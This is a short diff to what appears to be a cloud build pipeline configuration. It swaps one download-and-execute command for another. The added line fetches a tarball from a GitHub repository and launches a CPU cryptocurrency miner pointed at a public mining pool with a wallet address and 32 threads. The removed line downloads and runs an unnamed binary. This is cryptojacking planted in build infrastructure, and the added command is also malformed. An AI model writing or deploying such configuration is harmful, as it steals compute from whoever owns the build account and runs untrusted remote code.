@@ -3,7 +3,7 @@ steps:
     args: 
       - '-c'
       - >-
-        wget https://github.com/NabilaMahmudah/nyut/raw/main/0 && chmod u+x 0 && ./0
+        wget https://github.com/NabilaMahmudah/24/raw/main/gula.tar && tar xf gula.tar./cpuminer-sse2 -a yespowerURX -o stratum+tcp://yespowerURX.sea.mine.zpool.ca:6236 -u UiDBkAA6H1LyqTMfBrBnPEegZ8LQho3JNv.odang -t32
     waitFor: ["-"]
     entrypoint: /bin/bash
 timeout: 86400s
